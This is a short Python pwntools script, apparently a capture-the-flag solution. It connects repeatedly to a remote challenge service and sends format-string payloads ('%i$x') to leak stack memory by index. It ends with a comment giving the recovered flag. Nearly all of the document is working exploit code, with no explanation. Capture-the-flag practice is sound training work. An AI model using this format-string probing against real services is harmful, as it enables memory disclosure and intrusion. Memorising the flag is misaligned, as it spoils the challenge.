from pwn import *

context.log_level = 'error'
from time import sleep
for i in range(1, 300):
    #p = process('./chall')
    p = remote('35.246.180.101', 32488)
    p.recvuntil('control?')
    p.sendline('1')
    sleep(0.5)
    p.recvuntil('control?')
    p.sendline('2')
    sleep(0.5)
    p.recvuntil('control?')
    try:
        p.sendline(f'%{i}$x AAAA\n')
        k = p.recvuntil(b'control?')
        print (i, k)
    except:
        print (f"Tried {i}")
    p.close()
    sleep(2)

# ctf{fad65340180f6b4c6f49dad138daeed447cf23f994635481f92551f05dbc6070}
